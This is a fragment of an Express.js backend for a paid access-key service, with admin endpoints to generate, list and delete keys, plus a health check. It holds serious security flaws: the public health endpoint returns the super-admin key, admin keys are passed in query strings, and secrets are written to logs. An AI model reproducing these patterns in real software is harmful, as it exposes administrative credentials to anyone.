// 6. 管理员添加秘钥接口
app.post('/api/admin/keys', async (req, res) => {
    try {
        // 从查询参数获取管理员密钥，从body获取其他参数
        const adminKey = req.query.key;
        const { 
            durationHours = 24, 
            maxBind = 3, 
            remark = '', 
            isTestCard = false, 
            isPasswordCard = false 
        } = req.body;

        console.log('🔑 生成秘钥请求:', { 
            adminKey: adminKey ? adminKey.substring(0, 4) + '...' : '无密钥',
            durationHours,
            maxBind,
            remark,
            isTestCard,
            isPasswordCard
        });

        // 验证管理员密钥
        if (!adminKey) {
            return res.status(400).json({
                success: false,
                message: "错误: 需要提供管理员密钥"
            });
        }

        let isSuperAdmin = false;
        let adminInfo = null;

        // 检查是否是超级管理员
        if (adminKey === SUPER_ADMIN_KEY) {
            isSuperAdmin = true;
            adminInfo = { 
                name: '超级管理员', 
                key: SUPER_ADMIN_KEY, 
                email: 'super_admin@mknls.com' 
            };
            console.log('✅ 验证: 超级管理员身份');
        } else {
            // 检查普通管理员
            const keyData = await getAccessKey(adminKey);
            if (!keyData) {
                return res.status(403).json({
                    success: false,
                    message: "错误: 管理员密钥不存在"
                });
            }
            
            if (keyData.status !== 'active') {
                return res.status(403).json({
                    success: false,
                    message: "错误: 管理员密钥未激活"
                });
            }
            
            if (!keyData.is_admin) {
                return res.status(403).json({
                    success: false,
                    message: "错误: 非管理员密钥"
                });
            }
            
            isSuperAdmin = keyData.is_super_admin || false;
            adminInfo = { 
                name: keyData.added_by_name || '管理员', 
                key: keyData.added_by || 'unknown',
                email: keyData.added_by_email || 'unknown@mknls.com'
            };
            console.log('✅ 验证: 普通管理员身份');
        }

        // 参数验证
        let actualDuration = parseInt(durationHours) || 24;
        let actualMaxBind = parseInt(maxBind) || 3;
        let actualCardType = 'FULL';
        let actualRemark = remark || '';

        // 确定卡类型
        if (isTestCard === true) {
            actualDuration = 1;
            actualMaxBind = 1;
            actualCardType = 'TEST';
            actualRemark = actualRemark || '测试卡';
            console.log('📋 生成测试卡');
        } else if (isPasswordCard === true) {
            actualDuration = 1;
            actualMaxBind = 1;
            actualCardType = 'PASSWORD';
            actualRemark = actualRemark || '改密卡';
            console.log('📋 生成改密卡');
        } else {
            // 全功能卡
            if (!isSuperAdmin) {
                return res.status(403).json({
                    success: false,
                    message: "错误: 普通管理员只能生成测试卡和改密卡"
                });
            }
            
            actualRemark = actualRemark || '全功能卡';
            
            // 根据时长设置卡类型
            if (actualDuration >= 24 * 90) {
                actualCardType = 'DIAMOND';
            } else if (actualDuration >= 24 * 30) {
                actualCardType = 'PLATINUM';
            } else if (actualDuration >= 24 * 7) {
                actualCardType = 'GOLD';
            } else if (actualDuration >= 24 * 3) {
                actualCardType = 'SILVER';
            } else {
                actualCardType = 'BRONZE';
            }
            console.log('📋 生成全功能卡:', actualCardType);
        }

        // 生成新秘钥
        const newKey = generateAccessKey();
        const now = new Date();
        const expiryTime = new Date(now);
        expiryTime.setHours(expiryTime.getHours() + actualDuration);

        console.log('🔑 生成秘钥信息:', {
            密钥: newKey,
            类型: actualCardType,
            时长: `${actualDuration}小时`,
            到期: expiryTime.toLocaleString(),
            绑定数: actualMaxBind
        });

        // 准备秘钥数据
        const keyData = {
            key: newKey,
            remark: actualRemark,
            expiryTime: expiryTime.toISOString(),
            status: 'active',
            isAdmin: false,
            isSuperAdmin: false,
            isTestCard: isTestCard || false,
            isPasswordCard: isPasswordCard || false,
            durationHours: actualDuration,
            maxBind: actualMaxBind,
            boundEmails: [],
            boundAccounts: [],
            addedBy: adminInfo.key,
            addedByName: adminInfo.name,
            addedByEmail: adminInfo.email,
            cardType: actualCardType,
            activationTime: now.toISOString()
        };

        // 保存到数据库
        const createdKey = await createAccessKey(keyData);
        
        if (!createdKey) {
            throw new Error('创建秘钥失败');
        }

        // 记录日志
        const cardName = isTestCard ? '测试卡' : (isPasswordCard ? '改密卡' : actualCardType + '卡');
        
        await addOperationLog('generate_key', adminInfo.name, newKey, 
               `生成${cardName}成功：${actualRemark}`);
        
        await addAdminOperation({
            adminEmail: adminInfo.email,
            adminName: adminInfo.name,
            operationType: 'generate_key',
            targetKey: newKey,
            details: `生成秘钥: ${newKey}, 类型: ${cardName}, 时长: ${actualDuration}小时, 绑定: ${actualMaxBind}个`
        });

        console.log('✅ 秘钥生成成功:', newKey);

        // 返回成功响应
        res.json({
            success: true,
            key: newKey,
            message: `${cardName}生成成功！`,
            cardInfo: {
                type: actualCardType,
                duration: actualDuration,
                maxBind: actualMaxBind,
                isTestCard: isTestCard,
                isPasswordCard: isPasswordCard,
                expiryTime: expiryTime.toISOString()
            }
        });

    } catch (error) {
        console.error('❌ 生成秘钥错误:', error);
        
        // 返回详细的错误信息
        res.status(400).json({
            success: false,
            message: `生成秘钥失败: ${error.message}`,
            error: process.env.NODE_ENV === 'development' ? error.stack : undefined
        });
    }
});

// 7. 管理员获取分类秘钥列表
app.get('/api/admin/keys', async (req, res) => {
    try {
        const { key } = req.query;

        if (!key) {
            return res.status(400).json({
                success: false,
                message: "验证失败: 需要提供管理员密钥"
            });
        }

        let isSuperAdmin = false;
        let adminInfo = null;

        if (key === SUPER_ADMIN_KEY) {
            isSuperAdmin = true;
            adminInfo = { 
                name: '超级管理员', 
                key: SUPER_ADMIN_KEY,
                email: 'super_admin@mknls.com'
            };
        } else {
            const keyData = await getAccessKey(key);
            if (!keyData || !keyData.is_admin) {
                return res.status(403).json({
                    success: false,
                    message: "验证失败: 非管理员密钥或无权限"
                });
            }
            isSuperAdmin = keyData.is_super_admin || false;
            adminInfo = { 
                name: keyData.added_by_name || '管理员', 
                key: keyData.added_by || 'unknown',
                email: keyData.added_by_email || 'unknown@mknls.com'
            };
        }

        const allKeys = await getAllAccessKeys();
        const formattedKeys = allKeys.map(formatKeyData);
        
        const tgKeys = formattedKeys.filter(k => k.isTelegramGenerated);
        const superAdminKeys = formattedKeys.filter(k => k.isSuperAdmin && k.addedBy === SUPER_ADMIN_KEY);
        const normalAdminKeys = formattedKeys.filter(k => k.isAdmin && !k.isSuperAdmin && !k.isTelegramGenerated);
        
        const normalAdmins = {};
        normalAdminKeys.forEach(keyData => {
            const adminKey = keyData.addedBy;
            if (!normalAdmins[adminKey]) {
                normalAdmins[adminKey] = {
                    adminKey: adminKey,
                    adminName: keyData.addedByName || '未知管理员',
                    keys: []
                };
            }
            normalAdmins[adminKey].keys.push(keyData);
        });

        await addOperationLog('fetch_keys', adminInfo.name, key, '获取分类秘钥列表成功');

        res.json({
            success: true,
            keys: {
                telegram: tgKeys,
                superAdmin: superAdminKeys,
                normalAdmins: normalAdmins
            },
            adminInfo: {
                name: adminInfo.name,
                key: adminInfo.key,
                isSuperAdmin: isSuperAdmin
            }
        });

    } catch (error) {
        console.error('获取秘钥列表错误:', error);
        res.status(400).json({
            success: false,
            message: "验证失败: 服务器错误"
        });
    }
});

// 8. 管理员删除秘钥
app.delete('/api/admin/keys', async (req, res) => {
    try {
        const { key, keyToDelete } = req.query;

        if (!key || !keyToDelete) {
            return res.status(400).json({
                success: false,
                message: "验证失败"
            });
        }

        // 验证管理员权限
        let adminInfo = null;

        if (key === SUPER_ADMIN_KEY) {
            adminInfo = { name: '超级管理员', key: SUPER_ADMIN_KEY, email: 'super_admin@mknls.com' };
        } else {
            const keyData = await getAccessKey(key);
            if (!keyData || !keyData.is_admin) {
                return res.status(403).json({
                    success: false,
                    message: "验证失败"
                });
            }
            adminInfo = { 
                name: keyData.added_by_name || '管理员', 
                key: keyData.added_by || 'unknown',
                email: keyData.added_by_email
            };
        }

        const keyDataToDelete = await getAccessKey(keyToDelete);
        if (!keyDataToDelete) {
            return res.status(400).json({
                success: false,
                message: "要删除的秘钥不存在"
            });
        }

        // 检查删除权限（超级管理员可以删除任何秘钥，普通管理员只能删除自己生成的秘钥）
        if (key !== SUPER_ADMIN_KEY && keyDataToDelete.added_by !== adminInfo.key) {
            return res.status(403).json({
                success: false,
                message: "只能删除自己生成的秘钥"
            });
        }

        const deletedKey = await deleteAccessKey(keyToDelete);
        
        await addOperationLog('delete_key', adminInfo.name, keyToDelete, 
               `删除秘钥成功：${keyDataToDelete.remark || '无备注'}`);
        
        // 记录管理员操作
        await addAdminOperation({
            adminEmail: adminInfo.email,
            adminName: adminInfo.name,
            operationType: 'delete_key',
            targetKey: keyToDelete,
            targetAdmin: keyDataToDelete.added_by,
            details: `删除秘钥: ${keyToDelete}, 备注: ${keyDataToDelete.remark || '无'}`
        });

        res.json({
            success: true,
            message: "秘钥删除成功",
            deletedKey: formatKeyData(deletedKey)
        });

    } catch (error) {
        console.error('删除秘钥错误:', error);
        await addOperationLog('delete_key', 'unknown', 'unknown', '删除秘钥失败');
        res.status(400).json({
            success: false,
            message: "验证失败"
        });
    }
});

// 9. 健康检查接口
app.get('/api/health', async (req, res) => {
    try {
        const keysCount = await pool.query('SELECT COUNT(*) FROM access_keys');
        
        res.json({ 
            status: 'ok', 
            message: 'MKNLS 后端服务运行正常',
            database: 'connected',
            accessKeys: parseInt(keysCount.rows[0].count),
            superAdminKey: SUPER_ADMIN_KEY,
            telegram: TELEGRAM_BOT_TOKEN ? '已配置' : '未配置',
            timestamp: new Date().toISOString(),
            features: [
                '支持测试卡和改密卡',
                '分类秘钥管理',
                '多语言支持',
                '管理员操作记录',
                '修改邮箱和密码功能',
                'Telegram实时通知'
            ]
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: '数据库连接失败'
        });
    }
});

// 启动服务
app.listen(PORT, async () => {
    console.log(`🚀 MKNLS 后端服务启动中，端口：${PORT}`);
    
    // 验证环境变量
    if (missingEnv.length > 0) {
        console.error('❌ 缺少必要环境变量:', missingEnv.join(', '));
        console.log('请确保 .env 文件中包含以下变量:');
        console.log('FIREBASE_API_KEY=你的Firebase API密钥');
        console.log('RANK_URL=你的King等级API地址');
        console.log('DATABASE_URL=你的PostgreSQL连接字符串');
        console.log('TELEGRAM_BOT_TOKEN=你的Telegram机器人Token');
        console.log('TELEGRAM_CHAT_ID=你的Telegram Chat ID');
        process.exit(1);
    }
    
    try {
        await initDatabase();
        console.log('✅ 数据库初始化完成');
        console.log('🔑 超级管理员密钥:', SUPER_ADMIN_KEY);
        console.log('🤖 Telegram机器人:', TELEGRAM_BOT_TOKEN ? '已配置' : '未配置');
        console.log('📱 Telegram Chat ID:', TELEGRAM_CHAT_ID || '未配置');
        console.log('🎯 服务已就绪，等待请求...');
        console.log('===========================================');
    } catch (error) {
        console.error('❌ 服务启动失败:', error);
        process.exit(1);
    }
});
